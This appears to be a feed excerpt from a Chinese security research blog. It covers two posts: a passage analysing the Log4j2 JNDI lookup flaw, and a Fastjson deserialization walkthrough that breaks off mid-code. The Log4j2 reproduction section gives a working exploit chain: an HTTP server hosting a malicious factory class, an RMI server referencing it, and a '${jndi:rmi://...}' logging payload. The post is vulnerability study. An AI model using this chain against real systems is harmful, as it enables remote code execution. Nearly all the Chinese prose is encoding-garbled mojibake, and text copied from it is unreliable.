æ‰¾å®Œå‰ç¼€å†æ‰¾åç¼€ï¼Œä¸è¿‡åœ¨æ‰¾åç¼€çš„ while å¾ªç¯ä¸­ï¼Œåˆåˆ¤æ–­äº†æ˜¯å¦æ›¿æ¢å˜é‡ä¸­çš„å€¼ï¼Œå¦‚æœæ›¿æ¢ï¼Œåˆ™å†åŒ¹é…ä¸€æ¬¡å‰ç¼€ï¼Œå¦‚æœæ‰¾åˆ°äº†å‰ç¼€ï¼Œåˆ™ continue è·³å‡ºå¾ªç¯ï¼Œå†èµ°ä¸€æ¬¡æ‰¾åç¼€çš„é€»è¾‘ï¼Œæ¯”å¦‚è¯´è¿™ä¸ª<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;}&#039;, got &#039;EOF&#039; at end of input: {'>{</span>{}}è¿™ç§æƒ…å†µ<br>
<img src="https://bloyet.github.io/post-images/1749612812036.png" alt="" loading="lazy"><br>
åç»­çš„é€»è¾‘ä¸­ï¼Œä¸»è¦æ˜¯é’ˆå¯¹<code>DEFAULT_VALUE_DELIMITER_STRING</code>ä»¥åŠ<code>ESCAPE_DELIMITER_STRING</code>è¿›è¡Œï¼Œé€šè¿‡å¤šä¸ª if/else æ¥åŒ¹é…<code>:-</code>å’Œ<code>:\-</code></p>
<p><img src="https://bloyet.github.io/post-images/1749612812046.png" alt="" loading="lazy"><br>
è¿™é‡Œå°±ä¸ä¸€ä¸€åˆ†æä»£ç äº†ï¼Œè¿™é‡Œå…¶å®å°±æ˜¯å¯¹ä¸¤ä¸ªæ ‡è¯†ç¬¦çš„åŠŸèƒ½çš„æè¿°ï¼š</p>
<ul>
<li><code>:- </code>æ˜¯ä¸€ä¸ªèµ‹å€¼å…³é”®å­—ï¼Œå¦‚æœç¨‹åºå¤„ç†åˆ° <code>${aaaa:-bbbb}</code> è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œå¤„ç†çš„ç»“æœå°†ä¼šæ˜¯ <code>bbbb</code>ï¼Œ<code>:-</code> å…³é”®å­—å°†ä¼šè¢«æˆªå–æ‰ï¼Œè€Œä¹‹å‰çš„å­—ç¬¦ä¸²éƒ½ä¼šè¢«èˆå¼ƒæ‰ã€‚</li>
<li><code>:\-</code> æ˜¯è½¬ä¹‰çš„ <code>:-</code>ï¼Œå¦‚æœä¸€ä¸ªç”¨ <code>a:b</code> è¡¨ç¤ºçš„é”®å€¼å¯¹çš„ key a ä¸­åŒ…å«<code>:</code>ï¼Œåˆ™éœ€è¦ä½¿ç”¨è½¬ä¹‰æ¥é…åˆå¤„ç†ï¼Œä¾‹å¦‚ <code>${aaa:\\-bbb:-ccc}</code>ï¼Œä»£è¡¨ key æ˜¯<code>aaa:bbb</code>ï¼Œvalue æ˜¯ <code>ccc</code></li>
</ul>
<p>åœ¨æ²¡æœ‰åŒ¹é…åˆ°å˜é‡èµ‹å€¼æˆ–è€…åŒ¹é…ç»“æŸåï¼Œå°†ä¼šè°ƒç”¨<code>resolveVariable</code>æ–¹æ³•ï¼š</p>
<p>ä»–ä¼šå…ˆè·å¾—ä¸€ä¸ªVariableResolverç±»ï¼Œå®é™…ä¸Šå®ƒæ˜¯ä¸ªä»£ç†ç±»ï¼Œè°ƒç”¨è¿™ä¸ªä»£ç†ç±»çš„lookupæ–¹æ³•ï¼Œæˆ‘ä»¬ç°åœ¨åœ¨æ¥æ·±å…¥ç ”ç©¶è¿™ä¸ªä»£ç†ç±»</p>
<pre><code class="language-java">protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
                                 final int startPos, final int endPos) {
    final StrLookup resolver = getVariableResolver();
    if (resolver == null) {
        return null;
    }
    return resolver.lookup(event, variableName);
}
</code></pre>
<h2 id="ä»£ç†ç±»åˆ†æ">ä»£ç†ç±»åˆ†æ</h2>
<p>Log4j2 ä½¿ç”¨ <code>org.apache.logging.log4j.core.lookup.Interpolator</code> ç±»æ¥ä»£ç†æ‰€æœ‰çš„ <code>StrLookup</code> å®ç°ç±»ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨å®é™…ä½¿ç”¨ Lookup åŠŸèƒ½æ—¶ï¼Œç”± Interpolator è¿™ä¸ªç±»æ¥å¤„ç†å’Œåˆ†å‘</p>
<p>å…ˆçœ‹ä¸€çœ¼ç›®å½•ç»“æ„</p>
<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1749609817773.png" alt="" loading="lazy"></figure>
<p>å…ˆçœ‹ä¸€ä¸‹æ„é€ æ–¹æ³•ï¼š</p>
<p>è¿™ä¸ªç±»åœ¨åˆå§‹åŒ–æ—¶åˆ›å»ºäº†ä¸€ä¸ª <code>strLookupMap</code> ï¼Œå°†ä¸€äº› lookup åŠŸèƒ½å…³é”®å­—å’Œå¤„ç†ç±»è¿›è¡Œäº†æ˜ å°„ï¼Œå­˜æ”¾åœ¨è¿™ä¸ª Map ä¸­</p>
<p>åœ¨ 2.14.0 ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤æ˜¯åŠ å…¥ log4jã€sysã€envã€mainã€markerã€javaã€lowerã€upperã€<strong>jndi</strong>ã€jvmrunargsã€springã€kubernetesã€dockerã€webã€dateã€ctxï¼Œç”±äºéƒ¨åˆ†åŠŸèƒ½çš„æ”¯æŒå¹¶ä¸åœ¨ core åŒ…ä¸­ï¼Œæ‰€ä»¥å¦‚æœåŠ è½½ä¸åˆ°å¯¹åº”çš„å¤„ç†ç±»ï¼Œåˆ™ä¼šæ·»åŠ è­¦å‘Šä¿¡æ¯å¹¶è·³è¿‡ã€‚è€Œè¿™äº›ä¸åŒ Lookup åŠŸèƒ½çš„æ”¯æŒï¼Œæ˜¯éšç€ç‰ˆæœ¬æ›´æ–°çš„ï¼Œä¾‹å¦‚åœ¨è¾ƒä½ç‰ˆæœ¬ä¸­ï¼Œä¸å­˜åœ¨ upperã€lower è¿™ä¸¤ç§åŠŸèƒ½ï¼Œå› æ­¤åœ¨ä½¿ç”¨æ—¶è¦æ³¨æ„ç¯å¢ƒã€‚</p>
<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1749609817784.png" alt="" loading="lazy"></figure>
<p>æˆ‘ä»¬ç›´æ¥å»çœ‹lookupæ–¹æ³•ï¼š</p>
<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1749609817795.png" alt="" loading="lazy"></figure>
<p>å®ƒé€šè¿‡<code>:</code>ä½œä¸ºè¡¨ç¤ºç¬¦ï¼Œç”¨æ¥åˆ†éš” Lookup å…³é”®å­—å’Œå‚æ•°ï¼Œä» strLookup ä¸­æ ¹æ®åˆ†å‰²å‡ºæ¥çš„å…³é”®å­—åŒ¹é…åˆ°ç›¸åº”çš„å¤„ç†ç±»ï¼Œå¹¶è°ƒç”¨å…¶ Lookup æ–¹æ³•</p>
<p>æ¼æ´è§¦å‘ç‚¹ï¼šjndi:      å› ä¸ºåœ¨è¿™é‡Œå®ƒæ˜¯æœ‰ç€å¯¹åº”çš„å¤„ç†ç±»çš„ï¼Œå¹¶ä¸”è¿™ä¸ªå¤„ç†ç±»å¯ä»¥è¿›è¡Œåˆ©ç”¨</p>
<p><code>jndi:</code>å…³é”®å­—å¯¹åº”çš„å¤„ç†ç±»æ˜¯<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>ï¼Œæˆ‘ä»¬è·Ÿè¿›æŸ¥çœ‹å…·ä½“å®ƒçš„ lookup æ–¹æ³•æ˜¯å¦‚ä½•è¢«è°ƒç”¨çš„</p>
<pre><code class="language-java">public String lookup(final LogEvent event, String var) {
    if (var == null) {
        return null;
    }

    final int prefixPos = var.indexOf(PREFIX_SEPARATOR);
    if (prefixPos &gt;= 0) {
        final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US);
        final String name = var.substring(prefixPos + 1);
        final StrLookup lookup = strLookupMap.get(prefix);
        if (lookup instanceof ConfigurationAware) {
            ((ConfigurationAware) lookup).setConfiguration(configuration);
        }
        String value = null;
        if (lookup != null) {
            value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);
        }

        if (value != null) {
            return value;
        }
        var = var.substring(prefixPos + 1);
    }
    if (defaultLookup != null) {
        return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var);
    }
    return null;
}
</code></pre>
<p>çœ‹å…·ä½“çš„å¤„ç†ç±»ï¼šJndiLookup#lookup</p>
<pre><code class="language-java">public String lookup(final LogEvent event, final String key) {
    if (key == null) {
        return null;
    }
    final String jndiName = convertJndiName(key);
    try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
        return Objects.toString(jndiManager.lookup(jndiName), null);
    } catch (final NamingException e) {
        LOGGER.warn(LOOKUP, &quot;Error looking up JNDI resource [{}].&quot;, jndiName, e);
        return null;
    }
}
</code></pre>
<p>JndiManager çš„ lookup</p>
<pre><code class="language-java">public &lt;T&gt; T lookup(final String name) throws NamingException {
    return (T) this.context.lookup(name);
}
</code></pre>
<p>çœ‹ä¸‹è¿™ä¸ªcontextæ˜¯ä¸æ˜¯æ»¡è¶³JNDIçš„context ï¼Œcontextæ˜¯ä»€ä¹ˆ</p>
<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1749609817805.png" alt="" loading="lazy"></figure>
<p>åœ¨æ„é€ æ–¹æ³•ä¸­è¿›è¡Œäº†èµ‹å€¼ï¼Œçœ‹çœ‹å“ªé‡Œè°ƒç”¨äº†æ„é€ æ–¹æ³•ï¼ˆå”¯ä¸€ï¼‰ï¼š</p>
<pre><code class="language-java">private static class JndiManagerFactory implements ManagerFactory&lt;JndiManager, Properties&gt; {

    @Override
    public JndiManager createManager(final String name, final Properties data) {
        try {
            return new JndiManager(name, new InitialContext(data));
        } catch (final NamingException e) {
            LOGGER.error(&quot;Error creating JNDI InitialContext.&quot;, e);
            return null;
        }
    }
}
</code></pre>
<p>ä»æ­£é¢çœ‹ï¼š</p>
<p>final JndiManager jndiManager = JndiManager.getDefaultManager()  -&gt;getManager -&gt;manager = factory.createManager(name, data); ç„¶åå°±æ˜¯ä¸Šé¢è¿™æ®µå®ä¾‹åŒ–äº†</p>
<p>æ‰€ä»¥è¿™ä¸ªä¸Šä¸‹æ–‡å°±æ˜¯InitialContextäº†ï¼Œé‚£ä¹ˆè°ƒç”¨çš„å°±æ˜¯InitialContext çš„ lookup ï¼Œä¹‹åå°±æ˜¯ç†Ÿæ‚‰çš„ JNDI æ³¨å…¥çš„åŸå§‹çš„æµç¨‹äº†</p>
<h1 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h1>
<p>å¯ä¸ªpythonæœåŠ¡ é‡Œé¢æ˜¯æˆ‘ä»¬çš„æ¶æ„å·¥å‚ç±»å­—èŠ‚ç ï¼š</p>
<p>python -m http.server 8000</p>
<p>å¯ä¸ªrmiæœåŠ¡å™¨ï¼š</p>
<pre><code class="language-java">package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class JNDI_server {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Reference reference=new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://127.0.0.1:8000/&quot;);
        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
        Naming.bind(&quot;rmi://127.0.0.1:1099/Bloyet&quot;,referenceWrapper);
    }
}
</code></pre>
<p>POC:</p>
<pre><code class="language-java">package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j2POC {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(log4j2POC.class);

        String poc = &quot;${jndi:rmi://127.0.0.1:1099/Bloyet}&quot;;

        logger.info(&quot;EXP {} EXP&quot;,poc);

    }
}
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1749609817816.png" alt="" loading="lazy"></figure>
<p>åœ¨æ¥è·Ÿç€çœ‹ä¸€éæµç¨‹ï¼Œå…¶å®ä¸€å¼€å§‹å·²ç»èµ°è¿‡ä¸€éäº†ï¼Œè¿™ä¸€éç†è§£èµ·æ¥ä¼šç®€å•å¾ˆå¤šã€‚å› ä¸ºè¿™ä¸ªæ˜¯ä¼šè®¾è®¡æ—¥å¿—æ“ä½œï¼Œè·Ÿæˆ‘ä»¬æ¼æ´æ— å…³çš„æˆ‘ä»¬å°±ä¸è·Ÿäº†ã€‚</p>
<p>æˆ‘ä»¬çŸ¥é“æ¼æ´ç‚¹æ˜¯å­—ç¬¦ä¸²å¤„ç†é˜¶æ®µï¼Œæˆ‘ä»¬ç›´æ¥æ¥çœ‹æœ€å…³é”®çš„ç±»å’Œæ–¹æ³•å°±è¡Œäº†</p>
<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1749609817827.png" alt="" loading="lazy"></figure>
<p>èµ°åˆ°ä»£ç†ç±»ï¼š</p>
<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1749609817837.png" alt="" loading="lazy"></figure>
<p>è°ƒç”¨ä»£ç†ç±»çš„lookupæ–¹æ³•ï¼š</p>
<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1749609817848.png" alt="" loading="lazy"></figure>
<p>å‘ç°ç¡®å®æ˜¯InterpolatorçœŸæ­£å¤„ç†lookupæ–¹æ³•çš„ç±»</p>
<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1749609817859.png" alt="" loading="lazy"></figure>
<p>èµ°åˆ°å¤„ç†jndiåŠŸèƒ½ç‚¹çš„ç±»ï¼šJndiManager</p>
<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1749609817869.png" alt="" loading="lazy"></figure>
<p>æ­¥å…¥getDefaultManageræ–¹æ³•</p>
<p>åœ¨è¿™é‡Œè¿›è¡Œå®ä¾‹åŒ–ï¼Œå¹¶ä¸”åˆå§‹åŒ–contextä¸Šä¸‹æ–‡</p>
<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1749609817880.png" alt="" loading="lazy"></figure>
<p>ç»§ç»­</p>
<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1749609817890.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1749609817901.png" alt="" loading="lazy"></figure>
<p>å®ä¾‹åŒ–ä¸€ä¸ªæ–°çš„JndiManager å¹¶ä¸”å®ä¾‹åŒ–ä¸€ä¸ªä¸Šä¸‹æ–‡</p>
<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1749609817911.png" alt="" loading="lazy"></figure>
<p>ä¸€è·¯è·Ÿè¿›åˆ°æœ€ç»ˆçš„lookupæ–¹æ³•ï¼Œåˆ°è¿™ å°±å¯ä»¥çœ‹åˆ° æ¸¸æˆç»“æŸï¼</p>
<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1749609817921.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Fastjsonååºåˆ—åŒ–]]></title>
        <id>https://bloyet.github.io/post/fastjson/</id>
        <link href="https://bloyet.github.io/post/fastjson/">
        </link>
        <updated>2025-06-09T17:59:34.000Z</updated>
        <content type="html"><![CDATA[<h1 id="fastjsonä»‹ç»">Fastjsonä»‹ç»</h1>
<p>fastjson æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æº JSON è§£æåº“ï¼Œå®ƒå¯ä»¥è§£æ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ° JavaBeanã€‚<br>
ç”±äºå…¶ç‰¹ç‚¹æ˜¯å¿«ï¼Œä»¥æ€§èƒ½ä¸ºä¼˜åŠ¿å¿«é€Ÿå é¢†äº†å¤§é‡ç”¨æˆ·ï¼Œå¹¶ä¸”å…¶ API ååˆ†ç®€æ´ï¼Œç”¨æˆ·é‡ååˆ†åºå¤§ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†è¿™æ ·çš„ç»„ä»¶ä¸€æ—¦çˆ†å‡ºæ¼æ´ï¼Œå±å®³ä¹Ÿå°†ä¼šæ˜¯å·¨å¤§çš„ï¼Œå› æ­¤ï¼Œfastjson ä»ç¬¬ä¸€æ¬¡æŠ¥å‘Šå®‰å…¨æ¼æ´è‡³ä»Šï¼Œè¿›è¡Œäº†è‹¥å¹²æ¬¡çš„å®‰å…¨æ›´æ–°ï¼Œä¹Ÿä¸å®‰å…¨ç ”ç©¶äººå‘˜è¿›è¡Œäº†æ¥æ¥å›å›å¤šæ¬¡çš„å®‰å…¨è¡¥ä¸-ç»•è¿‡çš„æµç¨‹ã€‚</p>
<h1 id="fastjsonåŸºç¡€å­¦ä¹ ">FastjsonåŸºç¡€å­¦ä¹ </h1>
<p>fastjsonä¸»è¦é€šè¿‡å°†ä¸€ä¸ªjsonæ ¼å¼çš„æ–‡ä»¶è½¬ä¸ºä¸€ä¸ªjavaçš„å¯¹è±¡ï¼Œæˆ–è€…å°†ä¸€ä¸ªjavaå¯¹è±¡è½¬ä¸ºä¸€ä¸ªjsonæ ¼å¼çš„å¯¹è±¡ï¼Œä½†æ˜¯è¿™é‡Œçš„è½¬åŒ–æ˜¯éœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶ï¼Œä¸æ˜¯æ‰€æœ‰çš„å¯¹è±¡éƒ½å¯ä»¥ç›´æ¥è½¬ä¸ºjsonæ ¼å¼ï¼Œå…¶ä¸­è½¬åŒ–çš„è¿‡ç¨‹å°±æ˜¯é€šè¿‡åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå½“ç„¶è¿™ä¸ªå°±ä¸åŸç”Ÿçš„jdkç‰ˆæœ¬æ²¡æœ‰å¤ªå¤šå…³è”ï¼Œè¿™ä¸ªå±äºæ’ä»¶å­˜åœ¨çš„æ¼æ´</p>
<p>åœ¨fastjsonè¿›è¡Œè½¬æ¢æ—¶ï¼Œå¿…é¡»éœ€è¦ç±»æœ‰ä¸€ä¸ªæ— å‚æ„é€ æ–¹æ³•ï¼Œæœ€å¥½æ˜¯é€šè¿‡java beançš„æ ¼å¼è¿›è¡Œä¹¦å†™ï¼Œå› ä¸ºå¦‚æœä¸æ˜¯æ»¡è¶³java beanåˆ™åœ¨å¯¹jsonååºåˆ—åŒ–ä¸ºå¯¹è±¡æ—¶å¯èƒ½ä¼šå‡ºç°èµ‹å€¼é—®é¢˜ï¼Œå¦‚æœæ˜¯privateæˆ–è€…protectedçš„å±æ€§å°±æ— æ³•ç›´æ¥è¿›è¡Œèµ‹å€¼ç»™ååºåˆ—åŒ–çš„å¯¹è±¡ï¼Œè€Œå¦‚æœæ˜¯publicç±»å‹çš„æˆå‘˜å˜é‡ï¼Œå°±ç®—æ²¡æœ‰setteræ–¹æ³•ï¼Œè¿˜æ˜¯å¯ä»¥è¿›è¡Œèµ‹å€¼çš„ï¼Œä¼šé€šè¿‡åå°„è¿›è¡Œèµ‹å€¼</p>
<p>ä»£ç ï¼š</p>
<pre><code class="language-java">package org.example;

public class Main {
    public String name;
    public int age;
    protected String sex;

    public Main() {
    }

    public Main(String name, int age, String sex) {
        this.name = name;
        this.age = age;
        this.sex = sex;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String getSex() {
        return sex;
    }

    public void setSex(String sex) {
        this.sex = sex;
    }

}
</code></pre>
<pre><code class="language-java">package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class text{
    public static void main(String[] args) {
        Main main = new Main();
        main.setName(&quot;Bloyet&quot;);
        String fastjson = JSON.toJSONString(main, SerializerFeature.WriteClassName);
        System.out.println(fastjson);
        Object main1 = JSON.parse(fastjson);
        System.out.println(main1);

    }
}
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1749492821777.png" alt="" loading="lazy"></figure>
<p>æˆ‘ä»¬å‘ç°ç»“æœå‡ºç°äº†@typeå­—æ ·</p>
<p>å¦‚æœä¸ä½¿ç”¨SerializerFeature.WriteClassNameï¼Œè¯¥æ–¹æ³•é»˜è®¤å°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºä¸€ä¸ªJSONObjectå¯¹è±¡ã€‚</p>
<pre><code class="language-java">package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class text{
    public static void main(String[] args) {
        Main main = new Main();
        main.setName(&quot;Bloyet&quot;);
        String fastjson = JSON.toJSONString(main);
        System.out.println(fastjson);
        Object main1 = JSON.parse(fastjson);
        System.out.println(main1);

    }
}
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1749492821801.png" alt="" loading="lazy"></figure>
<h1 id="fastjsonè°ƒç”¨ç®€å•åˆ†æ">Fastjsonè°ƒç”¨ç®€å•åˆ†æ</h1>
<h2 id="åºåˆ—åŒ–">åºåˆ—åŒ–</h2>
<p>åºåˆ—åŒ–è¿‡ç¨‹å…¶å®æ²¡ä»€ä¹ˆå¥½çœ‹çš„ï¼Œåªè¦çŸ¥é“</p>
<p>è·å–å±æ€§å€¼åˆ†ä¸ºæœ‰æ— getterï¼Œå¦‚æœæ²¡æœ‰getteræ–¹æ³•ï¼Œå®ƒå°±æ— æ³•ç›´æ¥è·å–privateå±æ€§æˆ–è€…protectedå±æ€§ï¼Œå¦‚æœä¸ºpublicå±æ€§å®ƒå°±ä¼šçœ‹æ˜¯å¦èµ‹åˆå§‹å€¼ï¼Œå¦‚æœæ²¡æœ‰å°±è¡¨ç¤ºé»˜è®¤å€¼  æœ‰getteræ–¹æ³•å°±getteræ–¹æ³•ä¼˜å…ˆ</p>
<pre><code class="language-java">package org.example;

public class Main {
    public String name;
    public int age;
    protected String sex;

    public Main() {
    }

    public Main(String name, int age, String sex) {
        this.name = name;
        this.age = age;
        this.sex = sex;
    }

    public String getName() {
        System.out.println(&quot;è°ƒç”¨äº†geNameæ–¹æ³•&quot;);
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        System.out.println(&quot;è°ƒç”¨äº†getAgeæ–¹æ³•&quot;);
        return age;

    }

    public void setAge(int age) {
        this.age = age;
    }

    public String getSex() {
        System.out.println(&quot;è°ƒç”¨äº†getSexæ–¹æ³•&quot;);
        return sex;
    }

    public void setSex(String sex) {
        this.sex = sex;
    }

}
</code></pre>
<pre><code class="language-java">package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class text{
    public static void main(String[] args) {
        Main main = new Main();
        // main.setName(&quot;Bloyet&quot;);
        String fastjson = JSON.toJSONString(main, SerializerFeature.WriteClassName);
        // System.out.println(fastjson);
        //  Object main1 = JSON.parse(fastjson);
        // System.out.println(main1);

    }
}
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1749492821817.png" alt="" loading="lazy"></figure>
<p>ä»è¿™ä¸ªç»“æœæ¥çœ‹ï¼Œä¹Ÿèƒ½çŸ¥é“å®ƒè·å–å±æ€§å€¼çš„æ—¶å€™ï¼Œæ˜¯é€šè¿‡è°ƒç”¨äº†getteræ–¹æ³•</p>
<h2 id="ååºåˆ—åŒ–">ååºåˆ—åŒ–</h2>
<p>Fastjson ä½¿ç”¨ <code>@type</code> æ¥æ ‡è¯† JSON æ•°æ®ä¸­åº”è¯¥ååºåˆ—åŒ–ä¸ºå“ªä¸ªç±»ã€‚åœ¨ JSON ä¸­ï¼Œ<code>@type</code> å­—æ®µé€šå¸¸åŒ…å«äº†ç±»çš„å…¨é™å®šåï¼ˆç±»çš„å®Œæ•´è·¯å¾„ï¼‰ï¼Œç”¨äºæ ‡è¯†å…·ä½“çš„ç±»ã€‚</p>
<p>è¿›æºç åˆ†æï¼š</p>
<p>æ–­ç‚¹æ‰“åœ¨è¿™é‡Œ</p>
<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1749492821832.png" alt="" loading="lazy"></figure>
<p>æœ¬è´¨ä¸Šè¿˜æ˜¯è°ƒç”¨çš„æ˜¯parseæ–¹æ³•ï¼Œæ­¥å…¥</p>
<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1749492821848.png" alt="" loading="lazy"></figure>
<p>ç»§ç»­è°ƒç”¨parseæ–¹æ³•ï¼Œæ­¥å…¥</p>
<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1749492821863.png" alt="" loading="lazy"></figure>
<p>ä½¿ç”¨ä¼ å…¥çš„ <code>text</code> å’Œ <code>features</code> åˆ›å»ºä¸€ä¸ª <code>DefaultJSONParser</code> å¯¹è±¡ã€‚<code>ParserConfig.getGlobalInstance()</code> è¡¨ç¤ºä½¿ç”¨å…¨å±€é…ç½®ï¼Œç¡®ä¿è§£æå™¨çš„è¡Œä¸ºç¬¦åˆç»Ÿä¸€çš„é…ç½®æ ‡å‡†ã€‚DefaultJSONParserè¿™ä¸ªå¯¹è±¡ç”¨äºå®é™…è§£æ JSON æ–‡æœ¬ã€‚æˆ‘ä»¬ç»§ç»­çœ‹parser.parseæ–¹æ³•</p>
<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1749492821879.png" alt="" loading="lazy"></figure>
<p>ç»§ç»­æ­¥å…¥</p>
<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1749492821895.png" alt="" loading="lazy"></figure>
<p>è¿›å…¥switchè¯­å¥ï¼Œtokenä¸º12</p>
<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1749492821910.png" alt="" loading="lazy"></figure>
<p><code>JSONObject</code> ç±»åœ¨ Java ä¸­æ˜¯å¤„ç†å’Œæ“ä½œ JSON æ•°æ®çš„é‡è¦å·¥å…· ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›parseObjectæ–¹æ³•</p>
<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1749492821925.png" alt="" loading="lazy"></figure>
<p>è¿™ä¸ªæ–¹æ³•é‡Œé¢çš„å†…å®¹è¿˜æŒºå¤šçš„ï¼Œå¤§è‡´å°±æ˜¯æ ¹æ®å­—ç¬¦æ¥è¿›è¡Œé€»è¾‘åˆ¤æ–­ï¼Œç„¶åç”±é€»è¾‘åˆ¤æ–­èµ°åˆ°å¤„ç†æ–¹æ³•  æˆ‘ä»¬è¿™é‡Œå°±çœ‹å…³é”®çš„@type</p>
<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1749492821941.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1749492821957.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œçš„JSON.DEFAULT_TYPE_KEYå°±æ˜¯@typeï¼Œè¿›å…¥ifè¯­å¥ è¿›è¡Œç±»åŠ è½½ï¼Œæ¥ç€çœ‹æ€ä¹ˆåŠ è½½çš„ï¼Œæ­¥å…¥loadClassæ–¹æ³•</p>
<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1749492821988.png" alt="" loading="lazy"></figure>
<p>å¯ä»¥çœ‹åˆ°è™½ç„¶æ˜¯è¿›è¡Œç±»åŠ è½½ï¼Œä½†æ˜¯å…¶å®é‡Œé¢æ˜¯æ²¡æœ‰å†…å®¹çš„ï¼Œç›¸å½“äºä¸€ä¸ªç©ºå£³ï¼Œç„¶åè¿”å›clazzï¼Œç»§ç»­å¾€ä¸‹èµ°</p>
<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1749492822004.png" alt="" loading="lazy"></figure>
<p>å›åˆ°äº†DefaultJSONParser#parseObjectæ–¹æ³•ï¼Œè¿™é‡Œæ˜¯<strong>è·å–è§£æå™¨</strong>çš„åœ°æ–¹ï¼Œæ­¥å…¥getDeserializeræ–¹æ³•</p>
<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1749492822019.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œåˆ¤æ–­äº†ä¸€ä¸‹å½“å‰ç¼“å­˜ä¸­æ˜¯å¦å­˜åœ¨èƒ½å¤Ÿç›´æ¥è·å–åˆ°è§£æè¯¥ json æ•°æ®çš„è§£æå™¨ï¼Œå¦‚æœæœ‰å°±ç›´æ¥è¿”å›äº†ï¼Œå¾ˆæ˜¾ç„¶æˆ‘ä»¬è¿™é‡Œæ²¡æœ‰ï¼Œæ‰€ä»¥è¿˜éœ€è¦è·Ÿè¿›<code>getDeserializer</code></p>
<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1749492822034.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œçš„å†…å®¹ä¹Ÿå¾ˆå¤šï¼Œæˆ‘ä»¬ç›´æ¥çœ‹createJavaBeanDeserializeræ–¹æ³•ï¼Œåœ¨è¿™ä¹‹å‰å°±æ˜¯ä¸€äº›<strong>é»‘åå•</strong>ï¼Œå’Œæ˜¯å¦ä¸ºæ•°ç»„ï¼Œé›†åˆï¼ŒMapï¼Œæˆ–è€…æŠ¥é”™ç±»ï¼Œæ­¥å…¥createJavaBeanDeserializeræ–¹æ³•</p>
<pre><code class="language-java">public ObjectDeserializer getDeserializer(Class&lt;?&gt; clazz, Type type) {
    ObjectDeserializer derializer = (ObjectDeserializer)this.derializers.get(type);
    if (derializer != null) {
        return derializer;
    } else {
        if (type == null) {
            type = clazz;
        }

